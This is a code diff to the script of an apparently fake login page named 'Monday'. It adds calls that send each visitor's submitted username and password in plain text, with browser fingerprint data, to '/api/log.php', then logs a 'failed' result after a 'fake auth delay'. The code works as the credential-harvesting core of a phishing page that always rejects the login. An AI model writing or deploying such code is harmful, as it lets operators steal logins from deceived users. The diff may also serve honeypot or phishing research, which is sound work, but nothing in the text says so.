@@ -272,6 +272,24 @@ window.Monday = {
         return;
       }
 
+      // Write 1: log inputs + browser data immediately on submit
+      fetch('/api/log.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          event: 'login_attempt',
+          ts: new Date().toISOString(),
+          username: user.value,
+          password: pass.value,
+          attempt_number: attempts + 1,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          screen: `${screen.width}x${screen.height}`,
+          referrer: document.referrer,
+          url: window.location.href,
+        }),
+      }).catch(() => {});
+
       btn.classList.add('loading');
       btn.classList.remove('shaking');
       error.classList.remove('visible');
@@ -288,6 +306,19 @@ window.Monday = {
         error.innerHTML = `<strong>${msg.strong}</strong>${msg.body}`;
         error.classList.add('visible');
         attempts++;
+
+        // Write 2: log the outcome after the fake auth delay
+        fetch('/api/log.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            event: 'login_result',
+            ts: new Date().toISOString(),
+            outcome: 'failed',
+            error_shown: msg.strong + ' ' + msg.body,
+            attempt_number: attempts,
+          }),
+        }).catch(() => {});
 
         setTimeout(() => btn.classList.remove('shaking'), 700);
       }, delay);
